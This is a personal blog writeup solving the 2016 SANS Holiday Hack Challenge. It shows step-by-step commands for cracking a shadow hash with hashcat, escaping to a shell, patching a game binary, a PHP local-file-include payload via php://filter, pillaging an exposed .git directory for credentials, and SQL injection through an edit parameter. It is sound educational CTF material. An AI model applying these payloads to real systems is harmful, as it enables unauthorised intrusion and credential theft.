---
layout: post
author: KE
title: 2016 SANS Holiday Hack Challenge Writeup
tags:
- #sansholidayhack
---

This will be my writeup for the 2016 SANS Holiday Hack Challenge. It is still very much in my raw notes format. Hopefully I'll take the time to clean it up and make it more readable ;)

## PART 1: A Most Curious Business Card

### 1) What is the secret message in Santa's tweets?
There are many ways to approach this, *cleaner* methods such as extracting all the tweets using twitter's API or some form of coding. The gist of solving this question is by gathering all of [Santa's  tweets](https://twitter.com/SantaWClaus) to form an ASCII art, which will contain the answer.

I loaded all of Santa's tweets in my browser, selected all of them by highlighting with my cursor and copied into notepad++. From there, I used the search and replace function to remove all irrelevant characters and the resulting ascii art shows 'BUG BOUNTY'

Answer: BUG BOUNTY

### 2) What is inside the ZIP file distributed by Santa's team?
Based on the images shown in [Santa's instagram](https://www.instagram.com/p/BNpA2kEBF85/?taken-by=santawclaus), I noticed a URL (www.northpolewonderland.com) and a file name (SantaGram_v4.2.zip) in the image with the laptop on a desk. The zip file was downloaded by browsing to the URL: www.northpolewonderland.com/SantaGram_v4.2.zip

An APK file is inside the ZIP file and it is password protected. Using the secret message found in Santa's tweets, it was discovered that the password to the ZIP file is 'bugbounty'


## PART 2: Awesome Package Konveyance

### 3) What username and password are embedded in the APK file?

Using apktool, the APK was decompiled. A simple grep of all .smali files reveals a username and password in the b.smali and SplashScreen.smali

``` bash
$ grep 'password' *
b.smali:    const-string v1, "password"
Login$3$1$1.smali:    const-string v1, "We\'ve sent you an email to reset your password!"
SignUp$1.smali:    iget-object v0, v0, Lcom/northpolewonderland/santagram/SignUp;->passwordTxt:Landroid/widget/EditText;
SignUp$1.smali:    iget-object v1, v1, Lcom/northpolewonderland/santagram/SignUp;->passwordTxt:Landroid/widget/EditText;
SignUp.smali:.field passwordTxt:Landroid/widget/EditText;
SignUp.smali:    iget-object v1, p0, Lcom/northpolewonderland/santagram/SignUp;->passwordTxt:Landroid/widget/EditText;
SignUp.smali:    iput-object v0, p0, Lcom/northpolewonderland/santagram/SignUp;->passwordTxt:Landroid/widget/EditText;
SplashScreen.smali:    const-string v1, "password"
```

The contents of either file will show the username and password.

```
    const-string v1, "username"

    const-string v2, "guest"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "password"

    const-string v2, "busyreindeer78"
```

Username: guest  
Password: busyreindeer78

### 4) What is the name of the audible component (audio file) in the SantaGram APK file?

discombobulatedaudio1.mp3  
The file was found in SantaGram_4.2/res/raw

## PART 3: A Fresh-Baked Holiday Pi

### 5) What is the password for the "cranpi" account on the Cranberry Pi system?

Gather information on the partitions available in the cranbian image.

``` bash
root@6333f0f60bf6:~/hhc$ fdisk -l cranbian-jessie.img

Disk cranbian-jessie.img: 1.3 GiB, 1389363200 bytes, 2713600 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x5a7089a1

Device               Boot  Start     End Sectors  Size Id Type
cranbian-jessie.img1        8192  137215  129024   63M  c W95 FAT32 (LBA)
cranbian-jessie.img2      137216 2713599 2576384  1.2G 83 Linux
```

Extract the second partition using dd to obtain an ext4 image and mount it. fsck was required before it would let me mount the image.

``` bash
$ dd bs=70254592 if=cranbian-jessie.img of=cranbian-ext skip=1
$ losetup /dev/loop2 cranbian-ext
$ fsck /dev/loop2
$ mount /dev/loop2 /mnt/
```

Grab the /etc/passwd and /etc/shadow file.

``` bash
root@6587a3e5f040:/mnt/etc# cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:109::/var/run/dbus:/bin/false
avahi:x:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
ntp:x:106:111::/home/ntp:/bin/false
sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/bin/false
cranpi:x:1000:1000:,,,:/home/cranpi:/bin/bash

root@6587a3e5f040:/mnt/etc# cat shadow
root:*:17067:0:99999:7:::
daemon:*:17067:0:99999:7:::
bin:*:17067:0:99999:7:::
sys:*:17067:0:99999:7:::
sync:*:17067:0:99999:7:::
games:*:17067:0:99999:7:::
man:*:17067:0:99999:7:::
lp:*:17067:0:99999:7:::
mail:*:17067:0:99999:7:::
news:*:17067:0:99999:7:::
uucp:*:17067:0:99999:7:::
proxy:*:17067:0:99999:7:::
www-data:*:17067:0:99999:7:::
backup:*:17067:0:99999:7:::
list:*:17067:0:99999:7:::
irc:*:17067:0:99999:7:::
gnats:*:17067:0:99999:7:::
nobody:*:17067:0:99999:7:::
systemd-timesync:*:17067:0:99999:7:::
systemd-network:*:17067:0:99999:7:::
systemd-resolve:*:17067:0:99999:7:::
systemd-bus-proxy:*:17067:0:99999:7:::
messagebus:*:17067:0:99999:7:::
avahi:*:17067:0:99999:7:::
ntp:*:17067:0:99999:7:::
sshd:*:17067:0:99999:7:::
statd:*:17067:0:99999:7:::
cranpi:$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:17140:0:99999:7:::
```

Crack the password of the cranpi account using hashcat and the wordlist from a hint provided by 1 of the elves in game!

{% include image name="minty-candycane.png" caption="Minty Candycane: RockYou password list" %}  

```
> E:\Tools\hashcat-3.20\hashcat64.exe -m 1800 -a 0 "Part 3\hash.txt" E:\Tools\hashcat-3.20\wordlists\rockyou.txt

$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:yummycookies
```

HASH: $6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0
PASSWORD: yummycookies


### 6) How did you open each terminal door and where had the villain imprisoned Santa?

Santa was found in DFER in 1978 (The terminal door with the wumpus game, after going back to 1978 through the train terminal)

#### Scratchy

{% include image name="scratchy.png" caption="scratchy Terminal" %}

Scratchy was a tricky terminal. The trick lies in the commands `sudo` and `strings`.

``` bash
scratchy@cbbeb93495e5:/$ sudo -l
sudo: unable to resolve host cbbeb93495e5
Matching Defaults entries for scratchy on cbbeb93495e5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User scratchy may run the following commands on cbbeb93495e5:
    (itchy) NOPASSWD: /usr/sbin/tcpdump
    (itchy) NOPASSWD: /usr/bin/strings
```

Part 1:

``` bash
scratchy@8956a10a16f1:/$ sudo -u itchy strings /out.pcap
...snip...
<input type="hidden" name="part1" value="santasli" />
...snip...
```

Part 2:

``` bash
scratchy@b5d698c4390e:/$ sudo -u itchy strings -e l /out.pcap 
sudo: unable to resolve host b5d698c4390e
part2:ttlehelper
```

There is a bin file captured in the .pcap file, but some of the packets were missing and it wasn't possible to reconstruct the file

Key: santaslittlehelper

#### PROFESOR FALKEN

{% include image name="professor-falken.png" caption="Professor Falken Terminal" %}

Found a [reference](https://github.com/abs0/wargames/blob/master/wargames.sh) to the wargame and the replies used.

Used the following replies for the terminal:

`Hello.`

`I'm fine. How are you?`

`People sometimes make mistakes.`

`Love to. How about Global Thermonuclear War?`

`Later. Let's play Global Thermonuclear War.`

```
AWAITING FIRST STRIKE COMMAND
-----------------------------
PLEASE LIST PRIMARY TARGETS BY
CITY AND/OR COUNTRY NAME: 
Las Vegas
LAUNCH INITIATED, HERE'S THE KEY FOR YOUR TROUBLE: 
LOOK AT THE PRETTY LIGHTS
Press Enter To Continue
```

Key: LOOK AT THE PRETTY LIGHTS

#### Deep Directories

{% include image name="deep-file.png" caption="Deep File Terminal" %}

A simple `find` will locate the key for the door. 

``` bash
elf@a7ba94688298:~$ find . -type f
./.bashrc
./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt
./.profile
./.bash_logout
elf@a7ba94688298:~$ cat ./.doormat/.\ /\ /\\/\\\\/Don\'t\ Look\ Here\!/You\ are\ persistent\,\
 aren\'t\ you\?/\'/key_for_the_door.txt
key: open_sesame
```
Key: open_sesame

#### WUMPUS

{% include image name="wumpus.png" caption="wumpus Terminal" %}

**Play fair:**
[Man page](http://man.openbsd.org/wump.6) with instructions to play the game

{% include image name="wumpus-play-fair.png" caption="Playing the wumpus game" %}

**Cheat:**

1. Hex dump wumpus to extract binary to my own machine

``` bash
$ od -A x -t x1 -v wumpus
```

2. Patch the 'shoot' function: `jne to je`  
Modified assembly instructions:

```
0x0040177c      0f847e020000   je 0x401a00
0x00401a0a      740f           je 0x401a1b
```

3. Run the modified binary

Key: WUMPUS IS MISUNDERSTOOD


#### Train

{% include image name="train-management-console.png" caption="Train Management Console Terminal" %}

run HELP to get into less

{% include image name="train-management-console-HELP.png" caption="Train Management Console Terminal - HELP" %}

1. Run `!/bin/bash` to get shell
2. Run `./ActivateTrain` to travel back in time
3. Find santa in the DFER (Wumpus Terminal)

## PART 4: My Gosh... It's Full of Holes

### 7) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS:

#### 1. [X] - The Mobile Analytics Server (via credentialed login access)

Login using credentials found in APK  
`guest:busyreindeer78`

Click on 'mp3' to download mp3
[https://analytics.northpolewonderland.com/getaudio.php?id=20c216bc-b8b1-11e6-89e1-42010af00008](https://analytics.northpolewonderland.com/getaudio.php?id=20c216bc-b8b1-11e6-89e1-42010af00008)

#### 2. [X] - The Dungeon Game

This is going to be a simple *how I did it* as I'm currently not skilled enough in reverse engineering to identify the 'solution' to this challenge through RE alone.

We'll first start with NMAP on dungeon.northpolewonderland.com

NMAP discovered port: Discovered open port 11111/tcp on 35.184.47.139

``` bash
$ nc dungeon.northpolewonderland.com 11111
Welcome to Dungeon.                     This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
>
```

We have a dungeon game on dungeon.northpolewonderland.com:11111 

{% include image name="pepper-minstix.png" caption="Pepper Minstix: Old version of dungeon" %}

There's an elf that mentioned having an old version of the dungeon game, which I downloaded.

I searched around for walkthroughs or hints on playing the game. Here's how you can get the instructions for this version of the game:

``` bash
Welcome to Dungeon.                     This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
>open mailbox
Opening the mailbox reveals:
  A leaflet.
>take leaflet
Taken.
>read leaflet
...snip...
Your mission is to find the elf at the North Pole and barter with him
for information about holiday artifacts you need to complete your quest.

   While the original mission objective of collecting twenty treassures to
place in the trophy case is still in play, it is not necessary to finish
your quest.
...snip...
```

So we have to find the elf at the North Pole. Through my attempts at reverse engineering and understanding the binary, I found a *Game Debugging Tool (GDT)* within the game.

There are several commands available to the [GDT](http://gunkies.org/wiki/Zork_hints), but the ones that will help you win the game are AH and TK.

- AH allows moving to any room in the game
- TK allows you to take any item in the game

I created a python script to generate the steps to travel to all possible rooms in the game (from 1 to 255):

``` python
for room_num in range(1,255):
	print 'GDT'
	print 'AH'
	print room_num  # new room number
	print 'EX'      # exit GDT
	print 'L'       # look at surroundings in game
```

Fed the generated steps into the game:

``` bash
$ python steps_generator.py
$ ./dungeon < steps_generator.py
```

Discovered the room 191 and 192, the north pole:

```
>GDT
GDT>AH
Old=      0      New= 192
GDT>ex
>l
You have mysteriously reached the North Pole.
In the distance you detect the busy sounds of Santa's elves in full
production.

You are in a warm room, lit by both the fireplace but also the glow of
centuries old trophies.
On the wall is a sign:
                Songs of the seasons are in many parts
                To solve a puzzle is in our hearts
                Ask not what what the answer be,
                Without a trinket to satisfy me.
The elf is facing you keeping his back warmed by the fire.
```

Seems like the elf wants something from us. Using the same method I got a list of all items in game and found that the elf wanted the gold card. Replicating this in the online version:

```
>GDT
GDT>TK
Entry:    188
Taken.
GDT>ex
>i
You are carrying:
  A gold card.
>give gold card to elf
The elf, satisified with the trade says -
send email to "peppermint@northpolewonderland.com" for that which you seek.
The elf says - you have conquered this challenge - the game will now end.
```

{% include image name="email.png" caption="Reply from peppermint@northpolewonderland.com with audio file" %}

#### 3. [X] - The Debug Server

To get the POST request body for this challenge, I installed and played with the *SantaGram* APK we obtained in the previous parts. Take note of traffic going to dev.northpolewonderland.com.

The request should look something like :

``` http
POST /index.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; GT-N7100 Build/MOB30Z)
Host: dev.northpolewonderland.com
Connection: close
Accept-Encoding: gzip
Content-Length: 161

{"date":"20161218210747+0800","udid":"sadfsadfsdfsdfds","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":"73087064"}
```

And the response like this:

``` json
{
    "date": "20161218131022", 
    "request": {
        "date": "20161218210747+0800", 
        "debug": "com.northpolewonderland.santagram.EditProfile, EditProfile", 
        "freemem": "73087064", 
        "verbose": false, 
        "udid": "sadfsadfsdfsdfds"
    }, 
    "status.len": "2", 
    "filename": "debug-20161218131022-0.txt", 
    "filename.len": 26, 
    "date.len": 14, 
    "status": "OK"
}
```

Notice the *verbose* parameter and its value *false*, what would happen if we were to add that parameter to our request and change the value to true?

``` http
POST /index.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; GT-N7100 Build/MOB30Z)
Host: dev.northpolewonderland.com
Connection: close
Accept-Encoding: gzip
Content-Length: 161

{"date":"20161218210747+0800","udid":"sadfsadfsdfsdfds","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":"73087064","verbose":true}
```

Response:

``` json
{
    "date": "20161218131022", 
    "request": {
        "date": "20161218210747+0800", 
        "debug": "com.northpolewonderland.santagram.EditProfile, EditProfile", 
        "freemem": "73087064", 
        "verbose": true, 
        "udid": "sadfsadfsdfsdfds"
    }, 
    "status.len": "2", 
    "filename": "debug-20161218131022-0.txt", 
    "files": [
        "debug-20161218130749-0.txt", 
        "debug-20161218130809-0.txt", 
        "debug-20161218130825-0.txt", 
        "debug-20161218130833-0.txt", 
        "debug-20161218130925-0.txt", 
        "debug-20161218130950-0.txt", 
        "debug-20161218131000-0.txt", 
        "debug-20161218131004-0.txt", 
        "debug-20161218131022-0.txt", 
        "debug-20161224235959-0.mp3", 
        "index.php"
    ], 
    "filename.len": 26, 
    "date.len": 14, 
    "status": "OK"
}
```

Now just download the mp3 file:

``` bash
$ wget http://dev.northpolewonderland.com/debug-20161224235959-0.mp3
```

#### 4. [X] - The Banner Ad Server

[Meteor Miner](https://pen-testing.sans.org/blog/2016/12/06/mining-meteor)

1. Install [TamperMonkey](https://tampermonkey.net/) and [Metor Miner](https://github.com/nidem/MeteorMiner)
2. Browse to http://ads.northpolewonderland.com/
3. Routes in meteor miner show `/admin/quotes`
4. Browse to http://ads.northpolewonderland.com/admin/quotes
5. Run `HomeQuotes.find().fetch()` in Console
6. Click on the last Object in the array
7. Its details will show the location of the audio file: ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3
8. Download mp3 audio file `$ wget http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3`

{% include image name="admin-quotes.png" caption="Admin quotes with audio file details" %}

#### 5. [X] - The Uncaught Exception Handler Server

[PHP Local File Include](https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities)

Once again, going through the android app "SantaGram", we can observe traffic to ex.northpolewonderland.com

There are 2 types of operations in the POST requests: `ReadCrashDump` and `WriteCrashDump`

The `crashdump` parameter in `ReadCrashDump` is vulnerable to PHP local file include.

We can view the source of the exception.php page by making the following request:

``` http
POST /exception.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; GT-N7100 Build/MOB30Z)
Host: ex.northpolewonderland.com
Connection: close
Accept-Encoding: gzip
Content-Length: 106

{"operation":"ReadCrashDump","data":{"crashdump":"php://filter/convert.base64-encode/resource=exception"}}
```

Or in curl:

``` bash
curl -s -k -X $'POST' -H $'Content-Type: application/json' -H $'User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; GT-N7100 Build/MOB30Z)' --data-binary $'{\"operation\":\"ReadCrashDump\",\"data\":{\"crashdump\":\"php://filter/convert.base64-encode/resource=exception\"}}' $'http://ex.northpolewonderland.com/exception.php' | base64 -d
```

Response:

``` php
<?php

# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3

# Code from http://thisinterestsme.com/receiving-json-post-data-via-php/
# Make sure that it is a POST request.
if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){
    die("Request method must be POST\n");
}
...snip...
?>
```

Download the audio file:

``` bash
$ wget http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3
```

#### 6. [X] - The Mobile Analytics Server (post authentication)

{% include image name="minty-candycane.png" caption="Minty Candycane: NMAP - Finding extra files" %}  

Found `.git` directory: https://analytics.northpolewonderland.com/.git/ after running nmap: `nmap -sC -vv -p 443 analytics.northpolewonderland.com`

Install [DVCS-Pillage](https://github.com/evilpacket/DVCS-Pillage) and clone the `.git` directory.

Found 'administrator' credentials:

``` bash
$ git log
commit 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
Author: me <me@example.org>
Date:   Mon Nov 21 21:15:08 2016 -0800

	Fix database dump
```

``` bash
$ git diff-tree -p 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
...snip...
-INSERT INTO `users` VALUES (0,'administrator','KeepWatchingTheSkies'),(1,'guest','busyllama67');
...snip...
```

Logging in as 'administrator' shows a new page 'Edit'.

Digging through the source code obtained from the downloaded git repository, there are 2 files of interest in exploiting this web app: edit.php and query.php

The Query (query.php) page is used to query reports with an optional feature to save the reports.

query.php

``` php
$query = "SELECT * ";
$query .= "FROM `app_" . $type . "_reports` ";
$query .= "WHERE " . join(' AND ', $where) . " ";
$query .= "LIMIT 0, 100";
...snip...
$result = mysqli_query($db, "INSERT INTO `reports`
   (`id`, `name`, `description`, `query`)
...snip...
```

Looking at the *insert* statement, there are 3 columns: name, description and query. Query stores the *select* statement used for querying the report.

{% include image name="mobile-analytics-post-auth-edit-page.png" caption="Sprusage Usage Reporter - Edit page" %}

Now the Edit page allows one to edit the details of an existing report.

edit.php

``` php
    $result = mysqli_query($db, "SELECT * FROM `reports` WHERE `id`='" . mysqli_real_escape_string($db, $_GET['id']) . "' LIMIT 0, 1");
    if(!$result) {
      reply(500, "MySQL Error: " . mysqli_error($db));
      die();
    }
    $row = mysqli_fetch_assoc($result);

    # Update the row with the new values
    $set = [];
    foreach($row as $name => $value) {
      print "Checking for " . htmlentities($name) . "...<br>";
      if(isset($_GET[$name])) {
        print 'Yup!<br>';
        $set[] = "`$name`='" . mysqli_real_escape_string($db, $_GET[$name]) . "'";
      }
    }
```

The code goes through and updates each column of the *reports* table if the corresponding name and value is found in the GET request.

Here's an example of the default request to edit.php after clicking on 'Edit'

```
https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=
```

We can modify the value of the 'query' column of the existing report by adding a `query` parameter and value:

```
https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=&query=SELECT%20*%20FROM%20`audio`
```

This will let us perform a 'sql injection' attack by querying any data we want by first editing the 'query' of a report, and then viewing it.

Here's how I solved this challenge:

1. Edit the a report's query to view the rows in the *audio* table

```
https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=&query=SELECT%20*%20FROM%20`audio`
```

2. Now view the report

```
https://analytics.northpolewonderland.com/view.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029
```

3. To download the mp3, I used the `TO_BASE64()` function

```
https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=&query=SELECT%20TO_BASE64(mp3)%20FROM%20`audio`%20limit%201,%201
```

4. View and copy base64 of mp3 from the website, then decode the base64 and save the mp3 file

```
https://analytics.northpolewonderland.com/view.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029
```

### 8) What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.)

1. discombobulatedaudio1.mp3
2. discombobulatedaudio2.mp3
3. discombobulatedaudio3.mp3
4. debug-20161224235959-0.mp3
5. discombobulatedaudio5.mp3
6. discombobulated-audio-6-XyzE3N9YqKNH.mp3
7. discombobulatedaudio7.mp3

## PART 5: Discombobulated Audio

### 9) Who is the villain behind the nefarious plot.
Combine the audio files in audacity, and change the tempo to 700%

{% include image name="audacity_tempo.png" caption="Change tempo in audacity" %}

Found reference to "Doctor Who" quotes based on the sentence in the audio file
[Doctor Who (TV Series) - A Christmas Carol (2010) - Quotes](http://www.imdb.com/title/tt1672218/quotes)

Password for terminal in corridor: Father Christmas, Santa Claus. Or, as I've always known him, Jeff.

{% include image name="villain.png" caption="Villain behind the nefarious plot" %}

Villain: Dr. Who


### 10) Why had the villain abducted Santa?

To prevent the release of the Star Wars Holiday Special!

{% include image name="dr.who-rant-1.png" caption="Dr. Who rant 1" %}

{% include image name="dr.who-rant-2.png" caption="Dr. Who rant 2" %}  

## The End

That is all for the 2016 SANS Holiday Hack Challenge. Looking forward to the next one!
